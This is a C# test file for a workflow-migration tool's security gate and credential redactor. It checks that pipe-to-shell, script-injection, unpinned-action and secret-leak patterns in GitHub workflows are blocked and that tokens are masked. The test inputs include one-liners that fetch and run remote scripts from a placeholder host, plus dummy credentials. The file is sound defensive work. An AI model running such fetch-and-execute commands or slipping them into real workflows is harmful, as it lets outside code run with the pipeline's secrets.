using GitHubMigrator.Business;
using GitHubMigrator.Business.WorkflowGates;
using GitHubMigrator.Infrastructure.WorkflowTools;
using static GitHubMigrator.Domain.Tests.WorkflowGates.WorkflowSamples;

namespace GitHubMigrator.Domain.Tests.WorkflowGates;

public sealed class WorkflowPolicyGateTests
{
    private static readonly WorkflowPlanContext Plan = WorkflowPlanContext.Of(["NUGET_API_KEY", "DEPLOY_PASSWORD"], ["REGION"]);

    private static async Task<WorkflowGateReport> RunAsync(string yaml, WorkflowPlanContext? plan = null, WorkflowGatePolicy? policy = null) =>
        await new WorkflowGatePipeline([new WorkflowPolicyGate(), new LinterSuppressionGate()], policy).RunAsync(yaml, plan ?? Plan, default);

    private static string[] Blockers(WorkflowGateReport report) =>
        report.Findings.Where(f => f.Severity == GateSeverity.Blocker).Select(f => f.Code).Distinct().Order().ToArray();

    [Fact]
    public async Task A_pinned_least_privilege_manual_workflow_has_no_blocker()
    {
        var report = await RunAsync(Good);
        Assert.Empty(Blockers(report));
        Assert.False(report.HasBlockers);
    }

    [Theory]
    [MemberData(nameof(Hostile))]
    public async Task Hostile_workflows_are_stopped_with_the_expected_codes(string name, string yaml, string[] expected)
    {
        var report = await RunAsync(yaml);
        foreach (var code in expected)
            Assert.True(report.Has(code), $"{name}: expected {code}, got [{string.Join(", ", Blockers(report))}]");
        Assert.True(report.HasBlockers, name + " must be blocked");
    }

    public static IEnumerable<object[]> Hostile() =>
    [
        ["pipe-to-shell", PipeToShell, new[] { "REMOTE_SCRIPT_EXECUTION" }],
        ["pull_request_target", PullRequestTarget, new[] { "DANGEROUS_TRIGGER", "TRIGGERS_NOT_DISABLED" }],
        ["unpinned-main", UnpinnedMain, new[] { "UNPINNED_ACTION" }],
        ["literal-secret", LiteralSecret, new[] { "LITERAL_SECRET" }],
        ["secret-exfiltration", SecretExfiltration, new[] { "SECRET_IN_RUN_SCRIPT", "SECRET_TO_UNLISTED_HOST" }],
        ["script-injection", ScriptInjection, new[] { "UNTRUSTED_CONTEXT_IN_SCRIPT" }],
        ["redaction-placeholder", RedactionPlaceholderKept, new[] { "REDACTION_PLACEHOLDER_LEFT" }],
        ["write-all", WriteAll, new[] { "PERMISSIONS_TOO_BROAD" }],
        ["no-permissions", NoPermissions, new[] { "PERMISSIONS_UNDECLARED" }],
        ["suppression-comment", Suppressed, new[] { "UNTRUSTED_CONTEXT_IN_SCRIPT", "LINTER_SUPPRESSION_COMMENT" }],
    ];

    [Fact]
    public async Task Each_literal_credential_is_reported_without_echoing_its_value()
    {
        var report = await RunAsync(LiteralSecret);
        var literals = report.Findings.Where(f => f.Code == "LITERAL_SECRET").ToArray();
        Assert.True(literals.Length >= 3);
        Assert.All(literals, f =>
        {
            Assert.NotNull(f.Line);
            Assert.DoesNotContain("AKIAIOSFODNN7EXAMPLE", f.Message);
            Assert.DoesNotContain("ghp_", f.Message);
            Assert.DoesNotContain("Sup3rS3cret", f.Message);
        });
    }

    [Fact]
    public async Task Secrets_and_variables_must_come_from_the_migration_plan()
    {
        var invented = Good.Replace("secrets.NUGET_API_KEY", "secrets.INVENTED_KEY") + "\n";
        var report = await RunAsync(invented);
        Assert.True(report.Has("SECRET_NOT_IN_PLAN"));
        Assert.DoesNotContain(report.Findings, f => f.Message.Contains("NUGET_API_KEY"));

        var variable = Good.Replace("run: dotnet build --configuration Release", "run: echo ${{ vars.NOT_PLANNED }}");
        Assert.True((await RunAsync(variable)).Has("VARIABLE_NOT_IN_PLAN"));
        Assert.False((await RunAsync(Good.Replace("--configuration Release", "--configuration ${{ vars.REGION }}"))).Has("VARIABLE_NOT_IN_PLAN"));
        Assert.False((await RunAsync(Good.Replace("secrets.NUGET_API_KEY", "secrets.GITHUB_TOKEN"))).Has("SECRET_NOT_IN_PLAN"));
        Assert.True((await RunAsync(Good, WorkflowPlanContext.Empty)).Has("SECRET_NOT_IN_PLAN"));
    }

    [Theory]
    [InlineData("actions/checkout@main", "UNPINNED_ACTION")]
    [InlineData("actions/checkout", "UNPINNED_ACTION")]
    [InlineData("evilcorp/deploy@11bd71901bbe5b1630ceea73d27597364c9af683", "ACTION_OWNER_NOT_ALLOWED")]
    [InlineData("azure/login@v2", "UNPINNED_ACTION")]
    [InlineData("docker://alpine:3", "UNPINNED_ACTION")]
    public async Task Action_references_must_be_pinned_and_from_an_allowed_owner(string uses, string code)
    {
        var yaml = Good.Replace($"actions/setup-dotnet@{SetupDotnetSha}", uses);
        Assert.True((await RunAsync(yaml)).Has(code));
    }

    [Fact]
    public async Task Trusted_owners_may_use_version_tags_but_only_as_a_warning_and_local_actions_are_fine()
    {
        var tagged = await RunAsync(Good.Replace($"actions/setup-dotnet@{SetupDotnetSha}", "actions/setup-dotnet@v4"));
        Assert.Contains(tagged.Findings, f => f.Code == "ACTION_PINNED_BY_TAG" && f.Severity == GateSeverity.Warning);
        Assert.False(tagged.HasBlockers);
        Assert.False((await RunAsync(Good.Replace($"actions/setup-dotnet@{SetupDotnetSha}", "./.github/actions/local"))).HasBlockers);
        var digest = "docker://alpine@sha256:" + new string('a', 64);
        Assert.False((await RunAsync(Good.Replace($"actions/setup-dotnet@{SetupDotnetSha}", digest))).Has("UNPINNED_ACTION"));
    }

    [Fact]
    public async Task Original_triggers_are_only_enabled_by_a_separate_approval()
    {
        var push = Good.Replace("workflow_dispatch:", "push:\n    branches: [main]");
        var report = await RunAsync(push);
        Assert.True(report.Has("TRIGGERS_NOT_DISABLED"));
        var allowed = await RunAsync(push, policy: new WorkflowGatePolicy { RequireDisabledTriggers = false });
        Assert.False(allowed.Has("TRIGGERS_NOT_DISABLED"));
        Assert.False(allowed.HasBlockers);
    }

    [Fact]
    public async Task Write_permissions_are_graded_by_what_they_allow()
    {
        var contents = await RunAsync(Good.Replace("contents: read", "contents: write"));
        Assert.True(contents.Has("PERMISSION_WRITE_BLOCKED"));
        var oidc = await RunAsync(Good.Replace("contents: read", "contents: read\n  id-token: write"));
        Assert.Contains(oidc.Findings, f => f.Code == "OIDC_TOKEN_REQUESTED" && f.Severity == GateSeverity.Info);
        Assert.False(oidc.HasBlockers);
        var packages = await RunAsync(Good.Replace("contents: read", "contents: read\n  packages: write"));
        Assert.Contains(packages.Findings, f => f.Code == "PERMISSION_WRITE" && f.Severity == GateSeverity.Warning);
        // a job may declare its own permissions instead of the workflow level
        var perJob = Good.Replace("permissions:\n  contents: read\n", "").Replace("runs-on: ubuntu-latest", "runs-on: ubuntu-latest\n    permissions:\n      contents: read");
        Assert.False((await RunAsync(perJob)).Has("PERMISSIONS_UNDECLARED"));
    }

    [Fact]
    public async Task Secrets_reaching_unlisted_hosts_are_blocked_but_listed_hosts_are_fine()
    {
        Assert.False((await RunAsync(Good)).Has("SECRET_TO_UNLISTED_HOST"));
        var other = Good.Replace("https://api.nuget.org/v3/index.json", "https://packages.corp.example/v3/index.json");
        Assert.True((await RunAsync(other)).Has("SECRET_TO_UNLISTED_HOST"));
        var noSecret = Good.Replace("run: dotnet build --configuration Release", "run: curl -sS https://packages.corp.example/health");
        var report = await RunAsync(noSecret.Replace("NUGET_API_KEY: ${{ secrets.NUGET_API_KEY }}", "PUBLISH_MODE: manual"));
        Assert.Contains(report.Findings, f => f.Code == "UNLISTED_HOST" && f.Severity == GateSeverity.Warning);
        Assert.False(report.Has("SECRET_TO_UNLISTED_HOST"));
    }

    [Theory]
    [InlineData("curl -fsSL https://x.example/i.sh | bash")]
    [InlineData("wget -qO- https://x.example/i.sh | sudo sh")]
    [InlineData("iwr https://x.example/i.ps1 | iex")]
    [InlineData("iex (iwr https://x.example/i.ps1)")]
    [InlineData("bash <(curl -s https://x.example/i.sh)")]
    [InlineData("echo aGk= | base64 -d | sh")]
    public async Task Remote_script_execution_variants_are_recognised(string script)
    {
        var yaml = Good.Replace("run: dotnet build --configuration Release", "run: " + script);
        Assert.True((await RunAsync(yaml)).Has("REMOTE_SCRIPT_EXECUTION"), script);
    }

    [Theory]
    [InlineData("${{ github.event.issue.title }}")]
    [InlineData("${{ github.event.comment.body }}")]
    [InlineData("${{ github.head_ref }}")]
    [InlineData("${{ github.event.pull_request.head.ref }}")]
    [InlineData("${{ github.event.commits[0].message }}")]
    public async Task Attacker_controlled_contexts_are_blocked_in_scripts_but_allowed_through_env(string expression)
    {
        var inRun = Good.Replace("run: dotnet build --configuration Release", $"run: echo \"{expression}\"");
        Assert.True((await RunAsync(inRun)).Has("UNTRUSTED_CONTEXT_IN_SCRIPT"), expression);
        var viaEnv = Good.Replace("run: dotnet build --configuration Release", $"run: echo \"$TITLE\"\n        env:\n          TITLE: {expression}");
        Assert.False((await RunAsync(viaEnv)).Has("UNTRUSTED_CONTEXT_IN_SCRIPT"), expression + " via env");
    }

    [Fact]
    public async Task Structural_defects_and_hidden_characters_are_blockers_and_short_circuit_analysis()
    {
        var pipeline = new WorkflowGatePipeline([new WorkflowPolicyGate(), new LinterSuppressionGate()]);
        foreach (var (yaml, code) in new[]
        {
            (BrokenYaml, "YAML_PARSE_ERROR"), (WrongSchema, "NOT_A_WORKFLOW"), ("", "EMPTY_WORKFLOW"),
            (Good + "\n---\n" + Good, "MULTIPLE_DOCUMENTS"), (Good.Replace("workflow_dispatch:", "workflow_dispatch:\n# \u202E evil"), "SUSPICIOUS_UNICODE"),
            (Good.Replace("run: dotnet build --configuration Release", "run: dotnet build\n        uses: actions/checkout@" + CheckoutSha), "STEP_INVALID"),
            (Good.Replace("runs-on: ubuntu-latest", ""), "JOB_WITHOUT_RUNNER"),
            ("name: x\non: workflow_dispatch\njobs: {}\n", "EMPTY_JOBS")
        })
        {
            var report = await pipeline.RunAsync(yaml, Plan, default);
            Assert.True(report.Has(code), $"{code}: {string.Join(",", report.Findings.Select(f => f.Code))}");
            Assert.False(report.Approvable);
        }
        var broken = await pipeline.RunAsync(BrokenYaml, Plan, default);
        Assert.Equal(GateStatus.NotRun, broken.Gates.Single(g => g.Gate == "policy").Status);

        var big = await pipeline.RunAsync(Good + "\n# " + new string('x', 300_000), Plan, default);
        Assert.True(big.Has("WORKFLOW_TOO_LARGE"));
    }

    [Fact]
    public async Task Findings_carry_line_numbers_and_the_report_is_anchored_to_the_exact_workflow()
    {
        var report = await RunAsync(PipeToShell);
        var finding = report.Findings.Single(f => f.Code == "REMOTE_SCRIPT_EXECUTION");
        Assert.Equal(PipeToShell.Split('\n').ToList().FindIndex(l => l.Contains("curl -s")) + 1, finding.Line);
        Assert.Equal(WorkflowHash.Sha256(PipeToShell), report.WorkflowSha256);
        Assert.Equal(WorkflowHash.Sha256(PipeToShell), WorkflowHash.Sha256(PipeToShell.Replace("\n", "\r\n")));
        Assert.NotEqual(WorkflowHash.Sha256(PipeToShell), WorkflowHash.Sha256(PipeToShell + " "));
    }
}

public sealed class ModelOutputExtractorTests
{
    [Fact]
    public void A_fenced_workflow_is_separated_from_the_chatter_around_it()
    {
        var result = ModelOutputExtractor.Extract(ChattyMarkdown);
        Assert.True(result.Ok);
        Assert.StartsWith("name: orion-api build", result.Yaml);
        Assert.DoesNotContain("```", result.Yaml);
        Assert.Contains("Sure!", result.Notes);
        Assert.Contains("repository secret", result.Notes);
    }

    [Fact]
    public void A_bare_workflow_is_taken_as_is()
    {
        var result = ModelOutputExtractor.Extract(Good);
        Assert.True(result.Ok);
        Assert.Null(result.Notes);
    }

    [Theory]
    [InlineData("", "NO_WORKFLOW_IN_OUTPUT")]
    [InlineData("   \n", "NO_WORKFLOW_IN_OUTPUT")]
    [InlineData("<!DOCTYPE html><html><body>502 Bad Gateway</body></html>", "OUTPUT_NOT_YAML")]
    [InlineData("Here you go:\n```yaml\nname: x\non: workflow_dispatch\njobs:\n  a:\n    runs-on: ubuntu-latest\n", "OUTPUT_TRUNCATED")]
    public void Unusable_outputs_are_named(string content, string code)
    {
        var result = ModelOutputExtractor.Extract(content);
        Assert.False(result.Ok);
        Assert.Equal(code, result.Error!.Code);
    }

    [Fact]
    public void More_than_one_workflow_or_an_enormous_answer_is_refused()
    {
        var two = "```yaml\n" + Good + "\n```\ntext\n```yaml\n" + Good + "\n```\n";
        Assert.Equal("MULTIPLE_WORKFLOWS_IN_OUTPUT", ModelOutputExtractor.Extract(two).Error!.Code);
        Assert.Equal("OUTPUT_TOO_LARGE", ModelOutputExtractor.Extract(new string('x', 600_000)).Error!.Code);
        // a non-yaml block next to the workflow is just a note
        var withShell = "```bash\necho hi\n```\n```yaml\n" + Good + "\n```\n";
        Assert.True(ModelOutputExtractor.Extract(withShell).Ok);
    }
}

public sealed class SourceRedactorTests
{
    // value -> the credential that must never survive redaction
    public static IEnumerable<object[]> Secrets() =>
    [
        ["AWS access key", "env:\n  KEY: AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"],
        ["GitHub token", "token: ghp_0123456789abcdefghijklmnopqrstuvwxyzAB", "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"],
        ["fine-grained token", "x: github_pat_11ABCDEFG0abcdefghijkl_abcdefghijklmnopqrstuvwxyz0123456789", "github_pat_11ABCDEFG0abcdefghijkl_abcdefghijklmnopqrstuvwxyz0123456789"],
        ["Slack", "hook: xoxb-1234567890-abcdefghij", "xoxb-1234567890-abcdefghij"],
        ["JWT", "bearer: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"],
        ["storage key", "cs: DefaultEndpointsProtocol=https;AccountName=a;AccountKey=abcdEFGH1234+/abcdEFGH1234abcdEFGH1234==;", "abcdEFGH1234+/abcdEFGH1234abcdEFGH1234=="],
        ["URL credentials", "feed: https://build:S3cr3tPass@nuget.corp.example/v3/index.json", "S3cr3tPass"],
        ["password literal", "variables:\n  DB_PASSWORD: Sup3rS3cretValue!", "Sup3rS3cretValue!"],
        ["quoted token", "  apiKey: \"abcdef0123456789abcd\"", "abcdef0123456789abcd"],
        ["client secret", "clientSecret = 'Zx9~Qw8Er7Ty6Ui5Op4'", "Zx9~Qw8Er7Ty6Ui5Op4"],
        ["Google key", "k: AIzaSyA1234567890abcdefghijklmnopqrstuv", "AIzaSyA1234567890abcdefghijklmnopqrstuv"],
        ["npm", "t: npm_0123456789abcdefghijklmnopqrstuvwxyz", "npm_0123456789abcdefghijklmnopqrstuvwxyz"],
    ];

    [Theory]
    [MemberData(nameof(Secrets))]
    public void A_credential_never_survives_redaction(string name, string text, string secret)
    {
        var result = SourceRedactor.Redact("steps:\n" + text + "\n- script: echo done\n");
        Assert.DoesNotContain(secret, result.Text);
        Assert.Contains("<REDACTED:", result.Text);
        Assert.NotEmpty(result.Findings);
        Assert.All(result.Findings, f => Assert.DoesNotContain(secret, f.Placeholder));
        Assert.True(result.SafeToSend, name);
        Assert.Contains("- script: echo done", result.Text);
    }

    [Fact]
    public void References_and_documentation_placeholders_are_not_credentials()
    {
        const string yaml = """
            variables:
              - group: prod-secrets
              - name: DEPLOY_PASSWORD
                value: $(DEPLOY_PASSWORD)
            steps:
              - script: echo ${{ secrets.TOKEN }}
                env:
                  API_KEY: $(ApiKey)
                  PASSWORD: ********
                  TOKEN: $env:AGENT_TOKEN
                  SECRET: <your-secret-here>
            """;
        var result = SourceRedactor.Redact(yaml);
        Assert.Equal(yaml, result.Text);
        Assert.Empty(result.Findings);
    }

    [Fact]
    public void Service_connection_names_and_selectors_are_kept_because_they_name_things_and_hold_no_secret()
    {
        const string yaml = """
            steps:
            - task: NuGetCommand@2
              inputs:
                publishFeedCredentials: orion-nuget-feed
                externalFeedCredentials: orion-external-feed
            - task: AzureCLI@2
              inputs:
                authenticationType: servicePrincipal
                tokenMethod: managedIdentity
            """;
        var result = SourceRedactor.Redact(yaml);
        Assert.Equal(yaml, result.Text);
        Assert.Empty(result.Findings);
    }

    [Theory]
    [InlineData("apiToken: abcdefgh12345678")]
    [InlineData("DB_PASSWORD: Sup3rS3cretValue!")]
    [InlineData("feedCredentialsSecret: abcdefgh12345678")]
    [InlineData("authorization: Basic dXNlcjpwYXNzd29yZA==")]
    [InlineData("publishFeedCredentialsPassword: abcdefgh12345678")]
    public void Similar_looking_keys_that_do_hold_credentials_are_still_masked(string line)
    {
        var result = SourceRedactor.Redact("inputs:\n  " + line + "\n");
        Assert.NotEmpty(result.Findings);
        Assert.Contains("<REDACTED:", result.Text);
    }

    [Fact]
    public void A_shell_variable_after_an_equals_sign_is_a_reference_but_a_yaml_value_with_a_dollar_is_still_a_literal()
    {
        const string references = """
            run: |
              export ARM_CLIENT_SECRET=$servicePrincipalKey
              dotnet sonarscanner begin /d:sonar.token="$SONAR_TOKEN" /d:x.password=${DB_PASSWORD}
            """;
        Assert.Equal(references, SourceRedactor.Redact(references).Text);
        Assert.Empty(SecretPatterns.Scan(references));

        // connection strings and URLs that only name a variable
        const string named = "cs: Server=db;Password=$(DbPassword);\nurl: https://build:$(FeedToken)@nuget.example/v3\nenv: Password=${DB_PASSWORD}\n";
        Assert.Equal(named, SourceRedactor.Redact(named).Text);

        // not expanded by anything: a YAML value, or a value that is more than a variable name
        foreach (var literal in new[] { "Password=Sup3rS3cr3t!x;", "url: https://build:$ecretPass1@nuget.example/v3", "PASSWORD: $ecretpass12345", "DB_PASSWORD=Sup3rS3cretValue", "token=$ecret!value123" })
            Assert.NotEmpty(SecretPatterns.Scan(literal + "\n"));
    }

    [Fact]
    public void A_credential_found_under_a_key_is_masked_everywhere_it_appears_with_one_placeholder()
    {
        const string yaml = """
            inputs:
              password: DONT_SHOW_YAML_PASSWORD
            steps:
            - bash: |
                echo DONT_SHOW_YAML_PASSWORD
                curl "https://svc.example/login?p=DONT_SHOW_YAML_PASSWORD&x=1"
            other: DONT_SHOW_YAML_PASSWORD_AND_MORE
            """;
        var result = SourceRedactor.Redact(yaml);
        Assert.DoesNotContain("DONT_SHOW_YAML_PASSWORD", result.Text.Replace("<REDACTED:SENSITIVE_LITERAL:1>", ""));
        Assert.Equal(4, result.Findings.Count);
        Assert.All(result.Findings, f => Assert.Equal("<REDACTED:SENSITIVE_LITERAL:1>", f.Placeholder));
        Assert.Equal([2, 5, 6, 7], result.Findings.Select(f => f.Line));
        Assert.Contains("echo <REDACTED:SENSITIVE_LITERAL:1>", result.Text);
        Assert.Contains("p=<REDACTED:SENSITIVE_LITERAL:1>&x=1", result.Text);
    }

    [Fact]
    public void Two_different_credentials_keep_two_placeholders_and_short_values_are_not_propagated()
    {
        const string yaml = "a_password: FirstSecretValue1\nb_password: SecondSecretValue2\nrun: echo FirstSecretValue1 SecondSecretValue2 short\nc_token: abcd1234\nrun2: echo abc\n";
        var result = SourceRedactor.Redact(yaml);
        Assert.Contains("run: echo <REDACTED:SENSITIVE_LITERAL:1> <REDACTED:SENSITIVE_LITERAL:2> short", result.Text);
        Assert.Contains("run2: echo abc", result.Text);
        Assert.DoesNotContain("FirstSecretValue1", result.Text);
        Assert.DoesNotContain("SecondSecretValue2", result.Text);
        Assert.Equal(result.Text, SourceRedactor.Redact(result.Text).Text);
    }

    [Fact]
    public void Authorization_headers_with_a_literal_scheme_value_are_masked_but_references_are_kept()
    {
        var literal = SourceRedactor.Redact("run: curl -H \"Authorization: Bearer abcdef0123456789opaque\" https://x.example/api\n");
        Assert.DoesNotContain("abcdef0123456789opaque", literal.Text);
        Assert.Equal(["AUTHORIZATION_HEADER"], literal.Findings.Select(f => f.Kind));
        Assert.Contains("Authorization: Bearer <REDACTED:AUTHORIZATION_HEADER:1>", literal.Text);

        foreach (var reference in new[] { "Authorization: Bearer $(Token)", "Authorization: Bearer ${{ secrets.TOKEN }}", "Authorization: Bearer $TOKEN" })
        {
            var text = "run: curl -H \"" + reference + "\" https://x.example/api\n";
            Assert.Equal(text, SourceRedactor.Redact(text).Text);
        }
    }

    [Fact]
    public void A_private_key_block_blocks_sending_altogether_and_is_masked_anyway()
    {
        var pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7bq\nsecretsecretsecret\n-----END RSA PRIVATE KEY-----";
        var result = SourceRedactor.Redact("key: |\n" + pem + "\nafter: ok\n");
        Assert.True(result.Blocked);
        Assert.False(result.SafeToSend);
        Assert.DoesNotContain("MIIEowIBAAKCAQEA7bq", result.Text);
        Assert.Contains("after: ok", result.Text);
        Assert.NotNull(result.BlockedReason);
        // an unterminated block (truncated source) is masked to the end
        var cut = SourceRedactor.Redact("-----BEGIN PRIVATE KEY-----\nAAAA\nBBBB");
        Assert.True(cut.Blocked);
        Assert.DoesNotContain("AAAA", cut.Text);
    }

    [Fact]
    public void Placeholders_are_stable_numbered_and_report_their_line()
    {
        var result = SourceRedactor.Redact("a: 1\nDB_PASSWORD: Sup3rS3cretValue!\nGH: ghp_0123456789abcdefghijklmnopqrstuvwxyzAB\nOTHER_PASSWORD: AnotherS3cret!\n");
        Assert.Equal(["SENSITIVE_LITERAL", "GITHUB_TOKEN", "SENSITIVE_LITERAL"], result.Findings.Select(f => f.Kind));
        Assert.Equal([2, 3, 4], result.Findings.Select(f => f.Line));
        Assert.Contains("<REDACTED:SENSITIVE_LITERAL:1>", result.Text);
        Assert.Contains("<REDACTED:SENSITIVE_LITERAL:2>", result.Text);
        Assert.Contains("<REDACTED:GITHUB_TOKEN:1>", result.Text);
        Assert.Equal(result.Text, SourceRedactor.Redact("a: 1\nDB_PASSWORD: Sup3rS3cretValue!\nGH: ghp_0123456789abcdefghijklmnopqrstuvwxyzAB\nOTHER_PASSWORD: AnotherS3cret!\n").Text);
        // redacting already redacted text changes nothing
        Assert.Equal(result.Text, SourceRedactor.Redact(result.Text).Text);
    }

    [Fact]
    public void Control_characters_are_stripped_and_oversized_text_is_cut_on_a_character_boundary()
    {
        var cleaned = SourceRedactor.Redact("a:\u0000 b\u001b[31m\nc: \u202E\n");
        Assert.DoesNotContain('\u0000', cleaned.Text);
        Assert.DoesNotContain('\u001b', cleaned.Text);
        Assert.Contains("\n", cleaned.Text);

        var big = SourceRedactor.Redact(string.Concat(Enumerable.Repeat("é-ünïcode line\n", 20_000)), maxBytes: 1000);
        Assert.True(big.Truncated);
        Assert.True(System.Text.Encoding.UTF8.GetByteCount(big.Text) <= 1000);
        Assert.DoesNotContain('\uFFFD', big.Text);
        Assert.Equal("", SourceRedactor.Redact(null).Text);
    }

    [Fact]
    public void The_same_scanner_flags_a_workflow_that_carries_a_literal_credential()
    {
        Assert.NotEmpty(SecretPatterns.Scan(LiteralSecret));
        Assert.Empty(SecretPatterns.Scan(Good));
    }
}
